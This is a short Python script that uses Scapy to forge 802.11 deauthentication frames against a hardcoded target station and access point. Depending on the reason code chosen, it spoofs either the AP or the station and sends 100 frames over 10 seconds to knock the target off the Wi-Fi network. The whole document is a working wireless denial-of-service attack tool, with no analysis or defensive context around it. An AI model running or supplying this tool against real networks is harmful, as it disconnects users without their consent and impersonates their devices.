#! /usr/bin/env python
from scapy.all import * 

# choose the reason code
reasonCode = input("Enter reason code:\n1 - Unspecified\n4 - Disassociated due to inactivity\n5 - Disassociated because AP is unable to handle all currently associated stations\n8 - Deauthenticated because sending STA is leaving BSS\n")
print(reasonCode)

# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
target_mac = "56:37:f3:10:f0:e7" # MAC addr of the target STA
ap_mac = "2E:65:ED:50:BD:66" # MAC addr of the access point
iface = "wlan0" # interface to use to send deauth frame

if reasonCode == '1' or reasonCode == '4' or reasonCode == '5':
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=int(reasonCode))

    # send the stacked frame 100 times each 0.1s, this will cause a deauthentication for 10 seconds
    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)
elif reasonCode == '8':
    dot11 = Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=int(reasonCode))

    # send the stacked frame 100 times each 0.1s, this will cause a deauthentication for 10 seconds
    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)
else:
    print('Unsupported reason code')